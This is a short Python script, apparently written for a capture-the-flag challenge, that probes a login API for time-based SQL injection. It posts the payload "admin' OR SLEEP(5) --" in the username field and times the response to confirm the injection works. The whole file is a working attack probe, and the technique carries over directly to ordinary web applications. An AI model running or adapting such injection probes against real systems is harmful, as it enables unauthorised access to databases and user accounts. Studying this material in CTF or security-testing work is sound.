import requests
import time

URL = "https://blue-zenith-web.challs.sekai.team/api/login"

def test_time_based(payload, expected_delay=5):
    """Test if payload causes a time delay"""
    data = {
        "username": payload,
        "password": "x"
    }
    
    start = time.time()
    try:
        response = requests.post(URL, data=data, timeout=10)
        elapsed = time.time() - start
        
        print(f"Payload: {payload[:50]}...")
        print(f"Time: {elapsed:.2f}s")
        print(f"Response: {response.text[:100]}")
        
        # If it took longer than expected_delay - 1, injection worked
        if elapsed >= (expected_delay - 1):
            print("✓ TIME-BASED INJECTION WORKS!\n")
            return True
        else:
            print("✗ No delay detected\n")
            return False
            
    except requests.Timeout:
        print("✓ Request timed out - injection works!\n")
        return True
    except Exception as e:
        print(f"Error: {e}\n")
        return False

# Test basic time injection
print("[*] Testing basic SLEEP...")
test_time_based("admin' OR SLEEP(5) --", 5)
